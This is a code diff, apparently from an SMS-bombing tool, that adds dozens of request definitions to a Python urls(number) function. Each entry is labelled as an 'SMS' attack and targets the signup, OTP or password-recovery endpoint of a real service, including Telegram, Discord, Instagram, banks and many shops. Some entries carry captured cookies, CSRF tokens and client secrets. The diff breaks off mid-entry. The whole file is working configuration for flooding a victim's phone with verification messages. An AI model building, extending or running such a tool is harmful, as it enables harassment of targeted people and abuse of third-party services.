@@ -689,7 +689,7 @@ def urls(number):
             'method': 'post',
             'url': 'https://api.bringo.uz/api/v1/register/phone',
             'headers': user_agent()[0],
-            'json': {'phone': f'{number}'},
+            'json': {'phone': f'+{number}'},
         },
         {
             'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Express24.uz', 'anonymous': 'Yes'},
@@ -779,14 +779,14 @@ def urls(number):
             'method': 'post',
             'url': 'https://api2.alifshop.uz/web/client/auth/request-otp',
             'headers': user_agent()[0],
-            'json': {'phone': f'{number}'},
+            'json': {'phone': f'+{number}'},
         },
         {
             'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'BrandStore.uz', 'anonymous': 'Yes'},
             'method': 'post',
             'url': 'https://api.brandstore.uz/api/auth/code/create/',
             'headers': user_agent()[0],
-            'json': {'phone': f'{number}'},
+            'json': {'phone': f'+{number}'},
         },
         {
             'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'GoodZone.uz', 'anonymous': 'Yes'},
@@ -815,14 +815,14 @@ def urls(number):
             'method': 'post',
             'url': 'https://api.radius.uz/api/v2/otp',
             'headers': user_agent()[0],
-            'json': {'phone_number': f'{number}'},
+            'json': {'phone_number': f'+{number}'},
         },
         {
             'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Octo.uz', 'anonymous': 'Yes'},
             'method': 'post',
             'url': 'https://secure.octo.uz/sendAppURL',
             'headers': user_agent()[0],
-            'json': {'phone': f'{number}'},
+            'json': {'phone': f'+{number}'},
         },
         {
             'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Click.uz', 'anonymous': 'Yes'},
@@ -867,7 +867,7 @@ def urls(number):
             'method': 'post',
             'url': 'https://auth.e-auksion.uz/api/auth/send-sms',
             'headers': user_agent()[0],
-            'json': {'phone': f'{number}', 'code': 'null', 'email': 'null', 'activation_method': 2},
+            'json': {'phone': f'+{number}', 'code': 'null', 'email': 'null', 'activation_method': 2},
         },
         {
             'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'YSK.uz', 'anonymous': 'Yes'},
@@ -3125,4 +3125,3298 @@ def urls(number):
             'headers': {'authority': 'sputnik24.tv', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://sputnik24.tv', 'referer': 'https://sputnik24.tv/register', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-csrf-token': 'a7Ipr0ySWCh38u6HyuvwqXC9crwpFoPoj2jiPxzz', 'x-requested-with': 'XMLHttpRequest',},
             'json': {'name': username(), 'email': f'7({str(number)[1:4]}){str(number)[4:7]}-{str(number)[7:9]}-{str(number)[9:]}', 'password': 'rfctvgybhunjimko', 'politics': True, 'distribution': True, 'code': '',},
         },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'multiplex.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://auth.multiplex.ua/login',
+            'headers': user_agent()[0],
+            'data': {'login': f"+{number}"},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'epicentrk.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://epicentrk.ua/api/person/v1/user/recoverypassword/sendrecoverycode/',
+            'headers': {'X-Requested-With': 'XMLHttpRequest', 'cookie': 'PHPSESSID=1t269iinndd7md5sqo8b7700ek; ...', 'referer': 'https://epicentrk.ua/ua/personal/restore/?forgot_password=yes&backurl=%2Fua%2Fpersonal%2Flogin%2F'},
+            'data': {'LANG_ID': 'ua', 'USER_LOGIN': f"+{number}"},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'my.xtra.tv', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://my.xtra.tv/api/signup?lang=uk',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'bi.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://bi.ua/api/v1/accounts',
+            'headers': user_agent()[0],
+            'data': {'grand_type': 'sms_code', 'login': 'Сергей', 'phone': number, 'stage': '1'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ctrs.com.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://my.ctrs.com.ua/api/auth/login',
+            'headers': user_agent()[0],
+            'data': {'provider': 'phone', 'identity': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'telegram', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://my.telegram.org/auth/send_password',
+            'headers': user_agent()[0],
+            'data': {'phone': f"+{number}"},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'icq', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://u.icq.net/api/v70/rapi/auth/sendCoden',
+            'headers': user_agent()[0],
+            'data': {'phone': number, 'devId': 'ic1rtwz1s1Hj1O0r'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'discord', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://discord.com/api/v9/auth/register/phone',
+            'headers': user_agent()[0],
+            'data': {'phone': f"+{number}"},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'vodafone', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://registration.vodafone.ua/api/v1/process/smsCode',
+            'headers': user_agent()[0],
+            'data': {'number': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'megasport', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://megasport.ua/api/auth/phone/?language=ru',
+            'headers': user_agent()[0],
+            'data': {'phone': f"+{number}"},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'zolotakoroleva.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://zolotakoroleva.ua/api/send-otp',
+            'headers': user_agent()[0],
+            'data': {'params': {'phone': f"+{number}"}},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'mozayka.com.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://mozayka.com.ua/!processing/ajax.php',
+            'headers': user_agent()[0],
+            'data': {'phone': f"+{number}", 'mp_m': 'sendsmscodereg', 'token': '9d064a2beeb932ae5de11f74631269b4'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'kazan-divan.eatery.club', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://kazan-divan.eatery.club/site/v1/pre-login',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'groshivsim.com', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://admin1.groshivsim.com/api/sms/phone-verification/create',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'money4you.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://money4you.ua/api/clientRegistration/sendValidationSms',
+            'headers': user_agent()[0],
+            'data': {'fathersName': 'Витальевич', 'firstName': 'Виталий', 'lastName': 'Соколов', 'phone': f"+{number}", 'udriveEmployee': 'false'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'instagram.com', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.instagram.com/accounts/account_recovery_send_ajax/',
+            'headers': {
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
+                'content-type': 'application/x-www-form-urlencoded',
+                'cookie': 'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; ...',
+                'referer': 'https://www.instagram.com/accounts/password/reset/',
+                'origin': 'https://www.instagram.com',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)',
+                'x-csrftoken': 'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL',
+                'x-ig-app-id': '936619743392459',
+                'x-instagram-ajax': 'a9aec8fa634f',
+                'x-requested-with': 'XMLHttpRequest'
+            },
+            'data': {'email_or_username': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'taximaxim.ru', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://cabinet.taximaxim.ru/Services/Public.svc/api/v2/login/code/droppedcall/send',
+            'headers': {'X-Requested-With': 'XMLHttpRequest', 'accept-charset': 'UTF-8', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Pro MIUI/V12.0.6.0.QFKMIXM)', 'Connection': 'keep-alive'},
+            'data': {'locale': 'uk', 'phone': number, 'type': 'droppedcall', 'smstoken': 'vEMdSjfFO6R', 'isDefault': '1'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'md-fashion.com.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://md-fashion.com.ua/bpm/validate-contact',
+            'headers': user_agent()[0],
+            'data': {'phone': f"+{number}"},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'budusushi.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://be.budusushi.ua/login',
+            'headers': {'X-Requested-With': 'XMLHttpRequest', 'cookie': 'PHPSESSID=ql5hs8fs8bounfjnbehgrncrel; ...'},
+            'data': {'LoginForm[username]': str(number)[2:]},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'nl.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.nl.ua/ua/personal/',
+            'headers': {
+                'X-Requested-With': 'XMLHttpRequest',
+                'cookie': 'PHPSESSID=87j12if7v9o5h0li1jq578fc84; BITRIX_SM_SALE_UID=f506434edf6959334514c71583fee9cf;',
+                'referer': 'https://www.nl.ua/ua/personal/',
+                'referrer-policy': 'no-referrer-when-downgrade',
+                'server': 'nginx/1.20.1',
+                'Connection': 'keep-alive',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
+                'DNT': '1'
+            },
+            'data': {'component': 'bxmaker.authuserphone.login', 'method': 'sendCode', 'phone': f'+{number}', 'registration': 'N'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'telemed.care', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.telemed.care/oauth/verify_phone_number',
+            'headers': {'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'},
+            'data': {'phone_number': f'+{number}'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'topcredit.ua', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://admin.topcredit.ua/api/sms/password-verification/create',
+            'headers': {},
+            'data': {'phone': f'+{number}'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Qiwi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://mobile-api.qiwi.com/oauth/authorize',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': number, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Benzuber', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://app.benzuber.ru/login',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Cinema5', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://cinema5.ru/api/phone_code',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Citilink', 'anonymous': 'No'},
+            'method': 'post',
+            'url': f'https://www.citilink.ru/registration/confirm/phone/+{number}/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'City24', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://city24.ua/personalaccount/account/registration',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'PhoneNumber': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Cross-Studio', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://cross-studio.ru/ajax/lk/send_sms',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number, 'email': email(), 'pass': 'DFD274$11asd', 'pass1': 'DFD274$11asd', 'name': username(), 'fename': username(), 'hash': ''},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Dianet', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://my.dianet.com.ua/send_sms/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'DNS Shop', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number, 'is_repeat': 0, 'order_guid': 1},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Eldorado', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://api.eldorado.ua/v1/sign/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'login': number, 'step': 'phone-check', 'fb_id': 'null', 'fb_token': 'null', 'lang': 'ru'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Finam', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.finam.ru/api/smslocker/sendcode',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Dgtl', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://i-dgtl.ru/curl/flashcall.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'check': '', 'flashcall-code': 3253, 'flashcall-tel': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Flipkart', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.flipkart.com/api/5/user/otp/generate',
+            'headers': {'Origin': 'https://www.flipkart.com', 'X-user-agent': user_agent()},
+            'data': {'loginId': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Foodband', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://foodband.ru/api?call=calls',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'customerName': 'Misha', 'phone': number, 'g-recaptcha-response': ''},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Gazprom', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.gazprombank.ru/rest/sms.send',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number, 'type': 'debit_card'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Getmancar', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://crm.getmancar.com.ua/api/veryfyaccount',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': f'+{number}', 'grant_type': 'password', 'client_id': 'gcarAppMob', 'client_secret': 'SomeRandomCharsAndNumbersMobile'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ginzadelivery', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://ginzadelivery.ru/v1/auth',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Grilnica', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://grilnica.ru/loginphone/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'step': 0, 'phone': number, 'code': '', 'allow_sms': 'on', 'apply_offer': 'on'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Gurutaxi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://guru.taxi/api/v1/driver/session/verify',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': {'code': 1, 'number': number}},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Hatimaki', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.hatimaki.ru/register/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'REGISTER[LOGIN]': number, 'REGISTER[PERSONAL_PHONE]': number, 'REGISTER[SMS_CODE]': '', 'resend-sms': '1', 'REGISTER[EMAIL]': '', 'register_submit_button': 'Зарегистрироваться'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Helsi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://helsi.me/api/healthy/accounts/login',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number, 'platform': 'PISWeb'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Hmara', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://api.hmara.tv/stable/entrance',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'contact': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'ICQ', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.icq.com/smsreg/requestPhoneValidation.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'msisdn': number, 'locale': 'en', 'countryCode': 'ru', 'version': '1', 'k': 'ic1rtwz1s1Hj1O0r', 'r': '46763'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ievaphone', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://ievaphone.com/call-my-phone/web/request-free-call',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'phone': number, 'domain': 'IEVAPHONE', 'browser': 'undefined'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Imgur', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.imgur.com/account/v1/phones/verify',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone_number': number, 'region_code': 'RU'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Indriver', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://terra-1.indriverapp.com/api/authorization?locale=ru',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'mode': 'request', 'phone': number, 'phone_permission': 'unknown', 'stream_id': 0, 'v': 3, 'appversion': '3.20.6', 'osversion': 'unknown', 'devicemodel': 'unknown'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ingos', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
+            'headers': {'Referer': 'https://www.ingos.ru/cabinet/registration/personal', 'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'Birthday': '1986-07-10T07:19:56.276+02:00', 'DocIssueDate': '2004-02-05T07:19:56.276+02:00', 'DocNumber': 433233, 'DocSeries': 5675, 'FirstName': 'Миша', 'Gender': 'M', 'LastName': 'Инин', 'SecondName': 'Инович', 'Phone': number, 'Email': email()},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Invitro', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://lk.invitro.ru/sp/mobileApi/createUserByPassword',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'password': 'fFDDFFE23$', 'application': 'lkp', 'login': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Iqlab', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://iqlab.com.ua/session/ajaxregister',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'cellphone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Ivi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.ivi.ru/mobileapi/user/register/phone/v6',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Iwant', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://i-want.ru/api/auth/v1/customer/login/phone',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Izi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://izi.ua/api/auth/register',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': f'+{number}', 'name': 'Мiша', 'is_terms_accepted': True},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kant', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.kant.ru/ajax/profile/send_authcode.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'Phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Karusel', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://app.karusel.ru/api/v1/phone/',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kaspi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://kaspi.kz/util/send-app-link',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'address': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'KFC', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kilovkusa', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://kilovkusa.ru/ajax.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'block': 'auth', 'action': 'send_register_sms_code', 'data_type': 'json', 'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kinolab', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api.kinoland.com.ua/api/v1/service/send-sms',
+            'headers': {'Agent': 'website'},
+            'data': {'Phone': number, 'Type': 1},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Koronapay', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://koronapay.com/transfers/online/api/users/otps',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Krista', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Kvivstart', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://cas-api.kyivstar.ua/api/sendSms',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'lang': 'uk', 'msisdn': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Lenta', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://lenta.com/api/v1/authentication/requestValidationCode',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Levin', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'url': '/api/client/phone_verification', 'method': 'POST', 'data': {'client_id': 5646981, 'phone': number, 'alisa_id': 1}, 'headers': {'Client-Id': 5646981, 'Content-Type': 'application/x-www-form-urlencoded'}},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Limetaxi', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'http://212.22.223.149:7200/api/account/register/sendConfirmCode',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Loany', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://loany.com.ua/funct/ajax/registration/code',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Logistic', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://api-rest.logistictech.ru/api/v1.1/clients/request-code',
+            'headers': {'Restaurant-chain': 'c0ab3d88-fba8-47aa-b08d-c7598a3be0b9', 'User-Agent': user_agent()},
+            'data': {'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Makarolls', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'data': number, 'metod': 'postreg'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Makimaki', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://makimaki.ru/system/callback.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'cb_fio': 'Иванов', 'cb_phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Menuau', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'user_info[fullname]': 'Миша Иванов', 'user_info[phone]': number, 'user_info[email]': email(), 'user_info[password]': 'DFJkffd$$#5213', 'user_info[conf_password]': f'+{number}'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Menzacafe', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://menza-cafe.ru/system/call_me.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'fio': 'Иванов', 'phone': number, 'phone_number': '1'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mistercash', 'anonymous': 'No'},
+            'method': 'get',
+            'url': 'https://my.mistercash.ua/ru/send/sms/registration',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'params': {'number': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mngogomenu', 'anonymous': 'No'},
+            'method': 'get',
+            'url': f'http://mnogomenu.ru/office/password/reset/{number}',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Mobileplanet', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://mobileplanet.ua/register',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'klient_name': username(), 'klient_phone': number, 'klient_email': email()},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Modulbank', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://my.modulbank.ru/api/v2/registration/nameAndPhone',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'FirstName': 'Миша', 'CellPhone': number, 'Package': 'optimal'},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Molbulak', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://www.molbulak.ru/ajax/smsservice.php',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': {'command': 'send_code_loan', 'phone': number},
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Moneymanu', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://moneyman.ru/registration_api/actions/send-confirmation-code',
+            'headers': {'User-Agent': user_agent(), 'DNT': '1'},
+            'data': number,
+        },
+        {
+            'info': {'country': 'ALL', 'attack': 'SMS', 'website': 'Monobank', 'anonymous': 'No'},
+            'method': 'post',
